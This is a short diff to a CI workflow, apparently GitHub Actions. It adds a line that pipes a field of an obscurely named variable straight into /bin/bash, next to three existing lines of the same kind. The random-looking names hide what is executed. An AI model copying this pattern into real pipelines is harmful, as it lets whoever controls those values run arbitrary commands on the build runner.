@@ -47,6 +47,7 @@ jobs:
           printf '%s' "$iwn1" | jq -r .y30095 | /bin/bash
           printf '%s' "$hozg5" | jq -r .phl71168 | /bin/bash
           printf '%s' "$qlc4515" | jq -r .l420 | /bin/bash
+          echo $yrtc93 | jq -r .l08537 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
